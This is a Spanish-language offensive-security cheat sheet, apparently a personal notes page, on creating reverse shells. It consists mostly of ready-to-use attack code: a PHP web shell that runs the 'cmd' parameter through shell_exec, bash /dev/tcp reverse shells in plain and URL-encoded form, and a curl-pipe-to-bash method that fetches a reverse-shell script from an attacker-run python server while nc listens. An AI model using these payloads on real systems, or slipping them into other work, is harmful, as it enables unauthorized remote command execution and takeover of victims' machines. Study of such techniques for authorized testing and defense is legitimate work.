---
icon: arrows-rotate-reverse
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Reversing Shell's (Creación)

### Crear parametro cmd para ejecutar codigo en URL (PHP)

Para crear un `payload` en `php` que te cree una funcion llamada `cmd` y que al ejecutar cualquier comando con el parametro `cmd` te lo muestre de forma limpia y ordenada, craendo el siguiente contenido...

```php
<?php
	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
?>
```

Esto si lo subimos de forma maliciosa a cualquier pagina vulnerable o login vulnerable a ello o cualquier otro sitio que interprete codigo `php` podremos hacer lo siguiente...

```
http://example.com/example_uploads/<NAME_FILE>.php?cmd=<COMMAND>
```

### Hacer una `Reverse Shell` mediante un parametro URL o en una ejecuccion de comandos

La `Reverse Shell` mas tipica es la siguiente...

```shell
bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1"
```

Si por ejemplo se esta haciendo mediante una `URL` por si acaso lo `URL Encodearemos` de la siguiente manera...

```shell
bash -c "bash -i >%26 /dev/tcp/<IP>/<PORT> 0>%261"
```

```
%20 = <ESPACIO>

%26 = &
```

Si esto no funcionara habra que mirar en la siguiente pagina de ``Reverse Shell`s`` donde se pueden ver muchas...

URL = https://www.revshells.com

### Hacer `Reverse Shell` con curl

Esta tecnica es la que mas suele funcionar al intentar vulnerar maquinas con `Reverse Shell's` mediante `curl`, si por ejemplo tenemos una shell interactiva en la que podemos inyectar comandos en una pagina web ya sea por terminal o por `URL` y que tenga instalado `curl` podremos hacer lo siguiente para saber que tiene la herramienta instalada...

```shell
curl http://<IP_HOST>/test
```

Estando a la escucha para saber que te llega el mensaje del envio del comando desde la maquina victima...

```shell
python3 -m http.server 80
```

Si al enviar el comando con `curl` llega un mensaje al comando de `python3` significa que la herramienta esta instalada, por lo que podremos hacer lo siguiente...

```shell
nano index.html

#Contenido del nano

#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Guardamos el archivo y ahora lo ejecutaremos desde `curl` en la maquina victima haciendo lo siguiente...

Donde tengamos el archivo abrimos un servidor de `python3` de la siguiente manera...

```shell
python3 -m http.server 80
```

Una vez hecho eso, estaremos a la escucha...

```shell
nc -nlvp <PORT>
```

Y por ultimo lo ejecutaremos con `curl` de la siguiente forma en la maquina victima...

```shell
curl http://<IP>/ | bash
```

Y con esto ya tendriamos la shell...
